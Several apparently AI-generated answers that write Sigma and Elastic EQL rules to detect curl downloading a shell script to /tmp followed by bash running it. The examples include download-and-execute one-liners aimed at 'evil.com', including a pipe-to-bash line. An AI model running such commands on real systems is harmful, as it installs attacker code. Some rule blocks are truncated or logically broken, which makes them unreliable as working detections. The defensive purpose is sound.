text:
Below is a practical detection rule for the classic Linux **download-and-execute** pattern:

> `curl` writes/downloads a `.sh` script into `/tmp` **followed by** `bash` executing a script from `/tmp`.

Because this behavior spans **two separate process events**, the most reliable implementation is a **temporal correlation / sequence rule**: `curl` must occur before `bash` within a short time window.

---

## Detection Rule Logic

**Alert when, on the same host:**

1. A `curl` process has a command line indicating it is downloading/writing a shell script to `/tmp`, e.g.:
   - `curl ... -o /tmp/x.sh ...`
   - `curl ... --output /tmp/x.sh ...`
   - `curl ... > /tmp/x.sh`

2. Within a short window, typically **30–60 seconds**, a `bash` process executes a script from `/tmp`, e.g.:
   - `bash /tmp/x.sh`
   - `bash -c "bash /tmp/x.sh"`
   - `bash /tmp/update.sh`

---

# Sigma Rule – Temporal Sequence Detection

Use this as the primary rule if your Sigma implementation or SIEM supports correlation/sequence rules.

```yaml
title: Malicious Download and Execution - curl Downloads Bash Script to /tmp Followed by Bash
id: 3a72a922-7d1f-4d29-9f86-2b5d6a1c5f01
status: experimental
description: >
  Detects when curl downloads or redirects output to a .sh file under /tmp and
  a subsequent bash process executes a script from /tmp. This behavior is consistent
  with classic malware delivery using download-and-execute patterns.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
  - https://attack.mitre.org/techniques/T1059.001/
tags:
  - attack.execution
  - attack.command-and-control
logsource:
  product: linux
  category: process_creation
detection:
  curl_download_tmp_script:
    Image|endswith:
      - "/usr/bin/curl"
      - "/bin/curl"
    CommandLine|contains|all:
      - "/tmp/"
      - ".sh"

  bash_exec_tmp_script:
    Image|endswith:
      - "/usr/bin/bash"
      - "/bin/bash"
    CommandLine|contains|all:
      - "/tmp/"
      - ".sh"

  condition: curl_download_tmp_script or bash_exec_tmp_script

correlation:
  type: temporal_sequence
  rules:
    - curl_download_tmp_script
    - bash_exec_tmp_script
  group-by:
    - Hostname
  order:
    - curl_download_tmp_script
    - bash_exec_tmp_script
  timeframe: 30s
  threshold: 2
```

### Notes for SIEM deployment

If your SIEM does not support Sigma `correlation` blocks, split this into **two base rules**:

- **Rule A:** `curl` event containing `/tmp/` and `.sh`
- **Rule B:** `bash` event containing `/tmp/` and `.sh`

Then create a **sequence/correlation rule**:

```text
Rule A occurs before Rule B
within 30 seconds
on the same Hostname
```

Common field mappings:

| Sigma field | Possible SIEM field |
|---|---|
| `Hostname` | `host.name`, `DeviceId`, `ComputerName`, `host` |
| `Image` | `process.path`, `DeviceProcessPath`, `process_name` |
| `CommandLine` | `process.cmdline`, `DeviceProcessCommandLine`, `process_command_line` |
| `ParentCommandLine` | `process.parent.cmdline`, `DeviceParentProcessCommandLine` |

---

# Single-Event Fallback Rule

Some environments do not have good sequence correlation. A fallback rule can trigger when a `bash` process executes a `/tmp/*.sh` script **and the parent command line or its own command line already contains the curl download chain**.

This works well for one-liners such as:

```bash
sh -c "curl http://evil.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

```yaml
title: Malicious Download and Execution - bash Executes /tmp Script from curl Command Chain
id: 6a81c5d1-18ab-4f61-a53c-6b25f0f8e07f
status: experimental
description: >
  Detects bash execution of scripts under /tmp where the parent command chain
  or the command line itself contains curl activity involving /tmp and shell script artifacts.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
logsource:
  product: linux
  category: process_creation
detection:
  bash_exec_tmp_script:
    Image|endswith:
      - "/usr/bin/bash"
      - "/bin/bash"
    CommandLine|contains|all:
      - "/tmp/"
      - ".sh"

  curl_in_parent_command_line:
    ParentCommandLine|contains|all:
      - "curl"
      - "/tmp/"
      - ".sh"

  curl_in_own_command_line:
    CommandLine|contains|all:
      - "curl"
      - "/tmp/"
      - ".sh"

  condition: >
    bash_exec_tmp_script
    and
    (curl_in_parent_command_line or curl_in_own_command_line)
```

This fallback is less complete than the sequence rule, but it can detect many common one-command delivery chains.

---

# More Precise `curl` Matching Variant

The broad rule:

```yaml
CommandLine|contains|all:
  - "/tmp/"
  - ".sh"
```

is simple and catches many variants, but it can also match unrelated commands where `.sh` appears elsewhere in the command line.

If your SIEM supports regular expressions, you can replace the `curl_download_tmp_script` detection with this more precise variant:

```yaml
curl_download_tmp_script:
  Image|endswith:
    - "/usr/bin/curl"
    - "/bin/curl"
  CommandLine|re:
    - "(?i)curl\\s+.*(?:-o\\s+|--output\\s+|--output=|>\\s*)[\"']?/tmp/[^\"'\\s]+\\.sh(?=[\"'\\s]|$)"
```

This targets cases like:

```bash
curl http://example.com/script.sh -o /tmp/script.sh
curl -o /tmp/update.sh http://example.com/update.sh
curl --output /tmp/setup.sh http://example.com/setup.sh
curl https://example.com/x.sh > /tmp/x.sh
```

Use the precise regex variant if false positives become too high.

---

# Recommended Tuning

This behavior can also be generated by legitimate installers, monitoring agents, update scripts, or application deployment scripts. Before treating alerts as malicious, investigate:

- Parent process chain
- Full command line
- URL or domain contacted by `curl`
- Script contents in `/tmp`
- Whether the `bash` script spawned further suspicious processes
- Network connections created immediately after execution

Consider excluding only verified, known-good workflows, for example:

```yaml
filter_known_bad:
  CommandLine|contains:
    - "apt-get"
    - "dpkg"
    - "systemctl"
    - "yum"
    - "dnf"
    - "chef-client"
    - "puppet"
    - "salt-call"
condition: curl_download_tmp_script and not filter_known_bad
```

Do not blanket-exclude all `/tmp` script execution, as many malware samples legitimately use `/tmp`.

---

# Optional Extensions

To broaden coverage:

## 1. Include `sh` execution

Attackers may execute scripts with `sh` instead of `bash`:

```yaml
Image|endswith:
  - "/usr/bin/bash"
  - "/bin/bash"
  - "/usr/bin/sh"
  - "/bin/sh"
```

## 2. Include `wget`

The same download-and-execute pattern can use `wget`:

```yaml
wget_download_tmp_script:
  Image|endswith:
    - "/usr/bin/wget"
    - "/bin/wget"
  CommandLine|contains|all:
    - "/tmp/"
    - ".sh"
```

## 3. Include pipe-to-shell patterns

Although this is not strictly `/tmp` download-to-file followed by execution, this pattern is commonly associated with the same malware delivery technique:

```bash
curl http://evil.com/payload.sh | bash
```

A related rule can detect `curl` followed by `bash` within a short window without requiring `/tmp`.

---

# Severity

**Recommended severity: Medium to High**

This rule is highly suspicious when:

- The parent process is a shell, web server, cron job, service account, or remote access process
- The URL is unknown, newly registered, low reputation, or not associated with legitimate software delivery
- `/tmp` is writable by the user and no legitimate maintenance or deployment task is known
- The executed script immediately spawns network connections, reverse shells, persistence mechanisms, or privilege escalation behavior

text:
Below is a host-based detection rule for **Linux/Sysmon-style telemetry** that detects the classic download-and-execute pattern:

1. `curl` creates/writes a `.sh` file under `/tmp`.
2. `bash` executes a `.sh` file under `/tmp`.
3. The events are correlated on the **same host** within a configurable time window.

## Sigma rule with temporal correlation

```yaml
rules:
  - name: curl_download_tmp_sh
    title: Curl Downloads Bash Script to /tmp
    status: experimental
    description: >
      Detects a curl process creating or writing a bash script with a .sh extension
      to /tmp, using Sysmon file creation events.
    references:
      - https://attack.mitre.org/techniques/T1105/
      - https://attack.mitre.org/techniques/T1059/004/
    tags:
      - attack.execution
      - attack.command-and-control
      - attack.t1059.004
      - attack.t1105
    author: Detection Engineering
    date: 2026-02-19
    logsource:
      product: linux
      service: sysmon
    detection:
      curl_file_create:
        EventID: 11
        Image|contains:
          - '/curl'
          - 'curl'
      target_path_tmp:
        TargetFilename|startswith: '/tmp/'
      target_ext_sh:
        TargetFilename|endswith: '.sh'
      benign_parent_filter:
        ParentImage|startswith:
          - '/usr/bin/apt'
          - '/usr/bin/apt-get'
          - '/usr/lib/systemd/'
          - '/usr/sbin/sshd'
      condition: curl_file_create and target_path_tmp and target_ext_sh and not benign_parent_filter
    fields:
      - host.name
      - Image
      - ParentImage
      - TargetFilename
      - _time
    falsepositives:
      - Legitimate software update scripts
      - Administrative automation
      - Package manager helper scripts
      - CI/CD jobs downloading scripts into /tmp
    level: high

  - name: bash_exec_tmp_sh
    title: Bash Executes Script from /tmp
    status: experimental
    description: >
      Detects bash or sh execution of a script whose path is located under /tmp.
    references:
      - https://attack.mitre.org/techniques/T1059/004/
    tags:
      - attack.execution
      - attack.t1059.004
    author: Detection Engineering
    date: 2026-02-19
    logsource:
      product: linux
      service: sysmon
    detection:
      bash_process_create:
        EventID: 1
        Image|endswith:
          - '/bash'
          - '/sh'
      cmdline_contains_tmp:
        CommandLine|contains: '/tmp/'
      cmdline_contains_sh:
        CommandLine|contains: '.sh'
      benign_parent_filter:
        ParentImage|startswith:
          - '/usr/bin/apt'
          - '/usr/bin/apt-get'
          - '/usr/lib/systemd/'
          - '/usr/sbin/sshd'
      condition: bash_process_create and cmdline_contains_tmp and cmdline_contains_sh and not benign_parent_filter
    fields:
      - host.name
      - Image
      - ParentImage
      - CommandLine
      - _time
    falsepositives:
      - Legitimate scripts executed from /tmp during software installation or updates
      - Administrative maintenance scripts
      - Container initialization scripts
    level: high

  - name: malicious_curl_download_bash_execute_tmp_sh
    title: Malicious File Download and Execution via Curl and Bash
    category: correlation
    status: experimental
    description: >
      Detects curl downloading or writing a bash script to /tmp, followed by
      bash execution of a /tmp script on the same host within 30 minutes.
      This indicates classic download-and-execute malware delivery behavior.
    references:
      - https://attack.mitre.org/techniques/T1059/004/
      - https://attack.mitre.org/techniques/T1105/
    tags:
      - attack.execution
      - attack.command-and-control
      - attack.t1059.004
      - attack.t1105
    author: Detection Engineering
    date: 2026-02-19
    detection:
      event_references:
        download: curl_download_tmp_sh
        execute: bash_exec_tmp_sh
      correlation:
        type: temporal
        target: download
        group-by:
          - host.name
        time-frame: 30m
        conditions:
          download: "> 0"
          execute: "> 0"
    fields:
      - host.name
      - Image
      - ParentImage
      - TargetFilename
      - CommandLine
      - _time
    falsepositives:
      - Legitimate software installers using curl and bash scripts
      - Package update workflows
      - User or administrator workflows involving /tmp scripts
      - CI/CD runners downloading bootstrap scripts
    level: high
```

## Single-rule version if your SIEM does not support correlation rules

If your SIEM or Sigma version does not support `category: correlation`, use this simpler rule to detect the behavior and then add host/time correlation in your SIEM search or timeline logic.

```yaml
title: Malicious File Download and Execution via Curl and Bash
id: 49f7b2d8-92a8-4e16-9a3b-171d2b55b9d8
status: experimental
description: >
  Detects curl writing a bash script to /tmp followed by bash execution of
  a /tmp script. In environments without native correlation support, deploy
  as two rules and correlate in the SIEM using host.name and a 30-minute window.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
author: Detection Engineering
date: 2026-02-19
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.004
  - attack.t1105
logsource:
  product: linux
  service: sysmon
detection:
  curl_download_tmp_sh:
    EventID: 11
    Image|contains:
      - '/curl'
      - 'curl'
    TargetFilename|startswith: '/tmp/'
    TargetFilename|endswith: '.sh'

  bash_exec_tmp_sh:
    EventID: 1
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains:
      - '/tmp/'
      - '.sh'

  condition: curl_download_tmp_sh and bash_exec_tmp_sh
falsepositives:
  - Legitimate curl-based installers that write scripts to /tmp
  - Administrative scripts executed from /tmp
  - Update tools or container initialization routines
level: high
```

For this fallback rule, configure your SIEM to alert only when both events occur **on the same host** within a window such as **30 minutes**.

## Equivalent Elastic/EQL sequence

If you are using Elastic or an EQL-capable SIEM, this version enforces the “followed by” behavior more explicitly.

```eql
sequence with=1 by host.name
{
  process.name : "*curl"
  and file.path : "/tmp/*"
  and file.extension == "sh"
}
by 30m
{
  process.name : "*bash"
  and process.command_line : "*/tmp/*"
  and process.command_line : "*.sh"
}
```

If you are using `sh` or `dash` commonly, expand the second event to include those interpreters:

```eql
sequence with=1 by host.name
{
  process.name : "*curl"
  and file.path : "/tmp/*"
  and file.extension == "sh"
}
by 30m
{
  process.name : "*bash"
  or process.name : "*sh"
  or process.name : "*dash"
}
and process.command_line : "*/tmp/*.sh*"
```

Use the exact field names from your ECS mapping. Depending on telemetry, you may need:

- `file.path`
- `file.name`
- `file.extension`
- `process.executable`
- `process.name`
- `process.command_line`
- `process.parent.executable`

## Optional command-line-only variant

If you cannot reliably collect file creation events, but you can collect command-line telemetry, you can use this as an additional or fallback rule:

```yaml
title: Curl Download and Bash Execution via Command Line
id: 8f5a90b8-21b3-4d13-92d6-72b9e67d1c63
status: experimental
description: >
  Detects bash execution of a command line that references curl, /tmp, and a
  .sh script. This may capture combined download-and-execute commands such as
  bash -c "curl ... > /tmp/payload.sh && bash /tmp/payload.sh".
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
author: Detection Engineering
date: 2026-02-19
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.004
  - attack.t1105
logsource:
  product: linux
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - '.sh'
  condition: selection
falsepositives:
  - Legitimate administrative scripts
  - Software installer bootstrap commands
  - CI/CD bootstrap scripts
level: high
```

Use this command-line variant cautiously. It can produce more false positives than the correlated file/process rule, but it can help catch situations where `curl ... > /tmp/script.sh` is run inside a `bash -c` invocation.

text:
Below is a detection rule for the classic Linux download-and-execute pattern:

```text
curl → writes/writes-and-downloads → /tmp/*.sh → bash → executes /tmp/*.sh
```

This should be implemented as a **temporal correlation / sequence rule**, not just a single event rule.

---

## Detection Rule

**Rule name:**  
Malicious Download-and-Execute: `curl` Downloads `/tmp` Shell Script Then `bash` Executes It

**Target platform:**  
Linux endpoints / EDR / SIEM process creation events

**MITRE ATT&CK:**

- `T1105` — Ingress Tool Transfer
- `T1059.004` — Command and Scripting Interpreter: Unix Shell
- Likely associated with `T1059`, `T1105`, and initial execution after staging

**Correlation window:**  
5–10 minutes

**Correlate on:**

- Host / device / machine identifier
- User / account / session identifier, if available

---

## Rule Logic

### Event 1: `curl` Writes a Bash Script to `/tmp`

Detect a process whose image/path is `curl` and whose command line contains evidence that it is writing a shell script under `/tmp`.

Match `curl` commands such as:

```bash
curl https://example.com/script.sh -o /tmp/script.sh
curl https://example.com/script.sh --output /tmp/script.sh
curl https://example.com/script.sh --output=/tmp/script.sh
curl https://example.com/script.sh > /tmp/script.sh
curl https://example.com/script.sh >/tmp/script.sh
```

Suggested conditions:

```yaml
process_image_matches:
  - /bin/curl
  - /usr/bin/curl
  - curl

command_line_matches:
  - "-o "
  - "-o="
  - "--output "
  - "--output="
  - "> /tmp/"
  - ">/tmp/"

command_line_must_contain:
  - /tmp/
  - .sh
```

A stricter regex version:

```text
(?:-o|--output)[=\s]*"?/tmp/\S+\.sh
```

or redirection:

```text
>\s*"?/tmp/\S+\.sh
```

---

### Event 2: `bash` Executes a Script from `/tmp`

Detect a process whose image/path is `bash` and whose command line executes a `.sh` file under `/tmp`.

Match commands such as:

```bash
bash /tmp/script.sh
/bin/bash /tmp/script.sh
/usr/bin/bash /tmp/script.sh
bash -c "/tmp/script.sh"
bash -c "source /tmp/script.sh"
source /tmp/script.sh
```

Suggested conditions:

```yaml
process_image_matches:
  - /bin/bash
  - /usr/bin/bash
  - bash

command_line_must_contain:
  - /tmp/
  - .sh

command_line_matches_any:
  - "bash /tmp/"
  - "/bin/bash /tmp/"
  - "/usr/bin/bash /tmp/"
  - "source /tmp/"
  - "bash -c \"/tmp/"
  - "bash -c '/tmp/"
```

A stricter regex version:

```text
^(?:/usr/bin/|/bin/)?bash(?:\s+-\S+)*\s+"?/tmp/\S+\.sh(?:\s|$|;|\||&|>)
```

or:

```text
bash\s+-c\s+"?/tmp/\S+\.sh
```

or:

```text
bash\s+-c\s+"?source\s+/tmp/\S+\.sh
```

---

## Sigma Rule Example

The following uses **Sigma-style component rules plus a temporal correlation**. Field names such as `Image`, `CommandLine`, `Host`, and `User` may need to be translated to your EDR/SIEM log schema.

```yaml
# --------------------------------------------------------------------
# Component Rule 1
# --------------------------------------------------------------------
title: Curl Downloads Shell Script To Tmp
id: 621d6563-3737-4138-b815-84e697137398
status: experimental
description: >
  Detects curl writing or downloading a shell script under /tmp using
  -o/--output or shell redirection.

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/

logsource:
  category: process_creation
  product: linux

detection:
  selection_image:
    Image|endswith:
      - '/bin/curl'
      - '/usr/bin/curl'
      - '/curl'

  selection_output:
    CommandLine|re: "(?:-o|--output)[=\\s]*\"?/tmp/\\S+\\.sh"

  selection_redirect:
    CommandLine|re: ">\\s*\"?/tmp/\\S+\\.sh"

  condition: selection_image and (selection_output or selection_redirect)

falsepositives:
  - Legitimate software deployment
  - Bootstrap scripts
  - CI/CD runners
  - System configuration scripts

tags:
  - attack.command_and_control
  - attack.t1105
  - attack.initial_access
  - attack.t1059.004

# --------------------------------------------------------------------
# Component Rule 2
# --------------------------------------------------------------------
title: Bash Executes Shell Script From Tmp
id: 326d8232-996f-413d-b35f-01873b16d155
status: experimental
description: >
  Detects bash executing a shell script from /tmp.

references:
  - https://attack.mitre.org/techniques/T1059/

logsource:
  category: process_creation
  product: linux

detection:
  selection_image:
    Image|endswith:
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/bash'

  selection_direct:
    CommandLine|re: "^(?:/usr/bin/|/bin/)?bash(?:\\s+-\\S+)*\\s+\"?/tmp/\\S+\\.sh(?:\\s|$|;|\\||&|>)"

  selection_c_path:
    CommandLine|re: "bash\\s+-c\\s+\"?/tmp/\\S+\\.sh"

  selection_source:
    CommandLine|re: "bash\\s+-c\\s+\"?source\\s+/tmp/\\S+\\.sh"

  condition: selection_image and (selection_direct or selection_c_path or selection_source)

falsepositives:
  - Administrator maintenance scripts
  - Application installers
  - Development and testing workflows

tags:
  - attack.execution
  - attack.t1059.004

# --------------------------------------------------------------------
# Temporal Correlation Rule
# --------------------------------------------------------------------
title: Malicious Download And Execute Curl Tmp Script Followed By Bash
id: 55d93609-2b4d-43b8-8a66-779e69c337e2
status: experimental
description: >
  Detects a sequence where curl downloads or writes a bash script under /tmp
  and bash subsequently executes a script under /tmp. This indicates a common
  malware delivery and execution pattern.

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/

logsource:
  category: process_creation
  product: linux

detection:
  selection_base:
    Image|contains: '/'
  condition: selection_base

correlation:
  type: temporal
  timeframe: 10m
  group-by:
    - Host
    - User
  rules:
    - 621d6563-3737-4138-b815-84e697137398
    - 326d8232-996f-413d-b35f-01873b16d155

falsepositives:
  - Legitimate remote bootstrap scripts
  - Software updates using temporary scripts
  - Deployment automation tools

tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1105
  - attack.t1059.004
```

If your Sigma parser does not support this exact correlation syntax, implement the same logic as a SIEM-native sequence rule with these two event types:

```text
Event 1: curl writes .sh to /tmp
Event 2: bash executes .sh from /tmp
```

within the same host/user context.

## Elastic EQL Alternative

For Elastic Security / EQL-capable environments:

```eql
sequence by host.id, user.id with maxspan=10m
  [process where event.type == "start" and event.code == "1"
   and process.name == "curl"
   and (
     process.command_line =~ /(?:-o|--output)[=\s]*"?\/tmp\/\S+\.sh/
     or
     process.command_line =~ />\s*"?\/tmp\/\S+\.sh/
   )
  ]
  [process where event.type == "start" and event.code == "1"
   and process.name == "bash"
   and (
     process.command_line =~ /^(?:\/(?:usr\/)?bin\/)?bash(?:\s+-\S+)*\s+"?\/tmp\/\S+\.sh(?:\s|$|;|\||&|>)/
     or
     process.command_line =~ /bash\s+-c\s+"?\/tmp\/\S+\.sh/
     or
     process.command_line =~ /bash\s+-c\s+"?source\s+\/tmp\/\S+\.sh/
   )
  ]
```

Field names may need to be adjusted depending on your EDR or Elastic ingest pipeline. Common mappings:

```text

text:
Below is a temporal/sequence detection rule for Linux endpoint telemetry. It detects the classic **download-and-execute** pattern where `curl` writes a bash script to `/tmp`, and a subsequent `bash` process executes it.

A single process event is not enough; the rule must correlate two events over time.

## Elastic EQL rule: curl writes /tmp bash script, then bash executes it

```yaml
// Malicious Download-and-Execution of Bash Script from /tmp via curl
// High-fidelity rule using file-write events where available.

sequence by host.id, user.name with maxspan=15m
  [file where event.action in ("file_write", "create", "FileCreated", "WriteFile")
    and process.name == "curl"
    and (
      file.path : "/tmp/*.sh"
      or file.path : "/private/tmp/*.sh"
    )
  ]
  [process where event.action in ("start", "execve", "process_start", "ProcessCreate")
    and process.name in ("bash", "sh")
    and (
      process.args : "*/tmp/*.sh"
      or process.args : "*/private/tmp/*.sh"
      or (process.command_line : "* /tmp*" and process.command_line : "*.sh*")
      or (process.command_line : "*/private/tmp*" and process.command_line : "*.sh*")
    )
  ]
```

### Detection logic

1. A `curl` process writes/creates a file matching `/tmp/*.sh`.
2. Within 15 minutes, a `bash` or `sh` process executes a file matching `/tmp/*.sh`.
3. The events are correlated by the same host and user.

This maps to:

- **MITRE ATT&CK T1105** — Ingress Tool Transfer
- **MITRE ATT&CK T1059.004** — Command and Scripting Interpreter: Unix Shell

---

## Process-only EQL variant

If your telemetry does **not** provide file-create/write events, use this process-creation-only version. It is noisier but still catches the intended pattern.

```yaml
// Download-and-Execute of Bash Script from /tmp via curl
// Process-only telemetry variant

sequence by host.id, user.name with maxspan=15m
  [process where event.action in ("start", "execve", "process_start", "ProcessCreate")
    and process.name == "curl"
    and (
      // curl -o /tmp/script.sh
      // curl --output /tmp/script.sh
      ((process.args : "-o" or process.args : "--output")
        and (process.args : "*/tmp/*.sh" or process.args : "*/private/tmp/*.sh"))

      // curl --output=/tmp/script.sh
      or process.args : "--output=*/tmp/*.sh"
      or process.args : "--output=*/private/tmp/*.sh"

      // Command-line fallback
      or (
        (process.command_line : "*/tmp/*.sh*" or process.command_line : "*/private/tmp/*.sh*")
        and (process.command_line : "*-o*" or process.command_line : "*--output*")
      )
    )
    and (
      // Network download indicators
      process.args : "http*"
      or process.args : "https*"
      or process.args : "ftp*"
      or process.args : "ftps*"
      or process.command_line : "*http*"
      or process.command_line : "*https*"
      or process.command_line : "*ftp*"
    )
  ]
  [process where event.action in ("start", "execve", "process_start", "ProcessCreate")
    and process.name in ("bash", "sh")
    and (
      process.args : "*/tmp/*.sh"
      or process.args : "*/private/tmp/*.sh"
      or (process.command_line : "* /tmp*" and process.command_line : "*.sh*")
      or (process.command_line : "*/private/tmp*" and process.command_line : "*.sh*")
    )
  ]
```

---

## Tuning recommendations

- **Reduce false positives:**  
  Add exclusions for known package managers, deployment automation tools, or signed installer processes where appropriate.

- **Increase coverage:**  
  If malicious scripts are often dropped without a `.sh` extension, broaden the file path condition to `/tmp/*`, but consider adding a file-magic or shebang check to keep fidelity high.

- **Improve precision:**  
  If your SIEM/EDR can extract the script filename, correlate both steps on the same file basename to avoid matching unrelated `/tmp` activity within the time window.

- **Adjust the time window:**  
  `15m` is a reasonable default, but many real-world cases occur within seconds. A `3m` to `5m` window may be better where process/file latency is low.

Use a Linux process-creation detection rule that correlates a `curl` download/write to `/tmp` with a later `bash`/`sh` execution of a `/tmp` script. The example below is written as a Sigma rule.

```yaml
title: Bash Script Downloaded to /tmp by curl Then Executed
id: 69b5e53a-9101-4121-a291-72d0d132f6f8
status: experimental
description: |
  Detects a Linux curl process writing or downloading a Bash script to /tmp,
  followed by execution of that script using bash or sh.
  This pattern is commonly observed in download-and-execute malware delivery.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
author: Security
date: 2026-06-15
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  service: process_creation
  category: process_creation
detection:
  selection_curl_download:
    Image|endswith:
      - '/curl'
    CommandLine|re: '(?:-o|--output)[=\s]*(?:"|'')?/tmp/[^\s]+\.sh|>\s*(?:"|'')?/tmp/[^\s]+\.sh'

  selection_bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: selection_curl_download and selection_bash_execution
  timeframe: 5m
```

If your platform supports Sigma temporal correlation, add grouping by host/user to avoid correlating unrelated events across machines or accounts:

```yaml
  correlation:
    type: temporal
    timeframe: 5m
    fields:
      - Host
      - User
```

Field names may need adjustment depending on your log source, for example `Computer`, `HostName`, `Account`, `User`, or `ParentUser`.

For a simpler portable version that does not use regex:

```yaml

id: 5e35e6d1-1719-4f3f-b62d-b3c13a3b852d
status: experimental
description: |
  Detects a Linux curl process writing a file to /tmp followed by bash/sh execution
  of a /tmp script. This may indicate malicious download-and-execute behavior.
logsource:
  product: linux
  service: process_creation
  category: process_creation
detection:
  selection_curl:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '-o'
      - '/tmp/'

  selection_bash:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: selection_curl and selection_bash
  timeframe: 5m
```

Elastic EQL sequence equivalent:

```eql
sequence by host {
  process where (
    process.name == "curl"
    and (
      command_line == "*-o /tmp/*.sh*"
      or command_line == "*-o=\"/tmp/*.sh*"
      or command_line == "*--output /tmp/*.sh*"
      or command_line == "*--output=/tmp/*.sh*"
      or command_line == "*> /tmp/*.sh*"
      or command_line == "*>/tmp/*.sh*"
    )
  )

  5 minutes {
    process where (
      process.name in ("bash", "sh")
      and command_line == "*/tmp/*.sh*"
    )
  }
}
```

Tuning notes:

- If legitimate automation tools download scripts to `/tmp`, allowlist only by known parent processes, users, exact command lines, or verified software update paths. Do not broadly exclude `/tmp/`.
- To detect extension-less scripts, remove `.sh` from the curl regex and keep `/tmp/` execution detection, but expect more false positives.
- If `wget` is also used, add `/wget` and adjust output patterns such as `-O`, `--output-document`, and `>` redirects.
- Consider adding `chmod +x /tmp/*.sh` as a related behavior if you want a higher-confidence download-stage-execute chain.

text:
Below is a detection rule for the classic Linux “download-and-execute” pattern:

> `curl` writes/downloads a bash script into `/tmp`, and shortly afterward `bash` executes a script from `/tmp`.

I am giving the primary implementation as an **Elastic EQL sequence rule**, because the requirement contains “followed by,” which is best expressed as a process sequence. I am also including a **Sigma equivalent** if you prefer Sigma-based rules or need a tool-agnostic starting point.

---

## 1. Recommended rule: Elastic EQL sequence

This rule assumes ECS process-creation data, such as Elastic Endpoint, Sysmon for Linux, auditd, osquery, or similar.

```eql
sequence by host.name with maxspan=1m
  [process where event.category == "process" and event.action != "end"
    and process.name == "curl"
    and process.command_line ~ "(?i)(-o[\\s=]*|--output[\\s=]*|>\\s*)[\"']?/tmp/[^\\s\"']+\\.sh(?:[\\s\"';&|>]|$)"
  ]
  [process where event.category == "process" and event.action != "end"
    and (
      process.name == "bash"
      or process.name == "sh"
      or process.name == "dash"
      or process.name == "zsh"
    )
    and process.command_line ~ "(?i)\\b(bash|sh|dash|zsh)\\b.*[\"']?/tmp/[^\\s\"']+\\.sh(?:[\\s\"';&|>]|$)"
  ]
```

### Full Elastic Security-style rule block

```yaml
rule:
  rule_id: "5c793d5b-0f35-4d72-9b37-9e31f1e3b513"
  version: "1.0.0"
  name: "Curl Downloads Bash Script To /tmp Followed By Bash Execution"
  description: |
    Detects a curl process writing or downloading a bash script under /tmp,
    followed shortly by execution of a shell script from /tmp. This behavior
    is commonly associated with malware download-and-execute patterns.
  type: eql
  language: eql
  severity: high
  risk_score: 85
  license: Apache 2.0
  author: Detection Engineering
  status: experimental
  references:
    - https://attack.mitre.org/techniques/T1105/
    - https://attack.mitre.org/techniques/T1059/004/
  tags:
    - attack.command-and-scripting-interpreter
    - attack.ingress-tool-transfer
    - attack.t1059.004
    - attack.t1105
  data_source:
    index:
      - logs-endpoint.events.process*
    type: endpoint
    fields:
      - "@timestamp"
      - "event.category"
      - "event.action"
      - "host.name"
      - "process.name"
      - "process.executable"
      - "process.command_line"
      - "process.parent.name"
  eql: |
    sequence by host.name with maxspan=1m
      [process where event.category == "process" and event.action != "end"
        and process.name == "curl"
        and process.command_line ~ "(?i)(-o[\\s=]*|--output[\\s=]*|>\\s*)[\"']?/tmp/[^\\s\"']+\\.sh(?:[\\s\"';&|>]|$)"
      ]
      [process where event.category == "process" and event.action != "end"
        and (
          process.name == "bash"
          or process.name == "sh"
          or process.name == "dash"
          or process.name == "zsh"
        )
        and process.command_line ~ "(?i)\\b(bash|sh|dash|zsh)\\b.*[\"']?/tmp/[^\\s\"']+\\.sh(?:[\\s\"';&|>]|$)"
      ]
```

---

## 2. What this rule detects

The rule looks for two process events within one minute on the same host:

### First event: curl downloads a script to `/tmp`

Matches patterns such as:

```bash
curl http://example.com/payload.sh -o /tmp/payload.sh
curl https://example.com/install.sh --output /tmp/install.sh
curl https://example.com/install.sh > /tmp/install.sh
curl https://example.com/payload.sh -o '/tmp/my script.sh'
```

Regex highlights:

- `curl` process is observed.
- Command line contains `-o`, `--output`, or redirection to `/tmp`.
- Target filename is under `/tmp`.
- Filename ends with `.sh`.

### Second event: shell executes a script from `/tmp`

Matches patterns such as:

```bash
bash /tmp/payload.sh
sh /tmp/payload.sh
bash /tmp/payload.sh --help
bash -c /tmp/payload.sh
bash /tmp/payload.sh && echo done
bash /tmp/payload.sh > /tmp/output.log
```

Regex highlights:

- `bash`, `sh`, `dash`, or `zsh` process is observed.
- Command line contains execution of a `.sh` file under `/tmp`.

---

## 3. Sigma equivalent rules

If you do not have an SIEM with sequence support, or you prefer Sigma, deploy two detection rules and correlate them temporally.

### Sigma rule 1: curl downloads shell script to `/tmp`

```yaml

  Detects curl writing or downloading a shell script into /tmp.
status: experimental
author: Detection Engineering
date: 2026-01-01

  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.ingress-tool-transfer
  - attack.t1105
logsource:
  product: linux
  service: process_creation
  category: process_creation

    Image|endswith:
      - '/curl'
  selection_command:
    CommandLine|re:
      - "(?i)(-o[\\s=]*|--output[\\s=]*|>\\s*)[\"']?/tmp/[^\\s\"']+\\.sh(?:[\\s\"';&|>]|$)"
  condition: selection_image and selection_command
